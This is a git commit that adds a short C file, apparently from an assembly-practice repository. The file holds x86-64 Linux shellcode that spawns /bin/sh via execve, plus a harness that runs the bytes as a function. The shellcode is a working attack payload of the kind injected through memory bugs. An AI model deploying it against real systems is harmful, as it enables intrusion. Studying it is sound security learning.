15d5af310cb17e82ccb0b2c851c88c47428313e4
PyR3Q <61708525+pyr3q@users.noreply.github.com>
2020-04-17 14:20:44 +0200

    Create shellcode.c

---
+++ ASM/Shell/shellcode.c
@@ -0,0 +1,13 @@
+/* @PyR3Q */
+
+#include <stdio.h>
+#include <string.h>
+
+unsigned char shellcode[] = "\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x73\x68\x00\x57\x54\x5f\xb8\x3b\x00\x00\x00\x50\x99\x0f\x05";
+
+int main()
+{
+	int(*f)() = (int(*)())shellcode;
+	f();
+	return 0;
+}
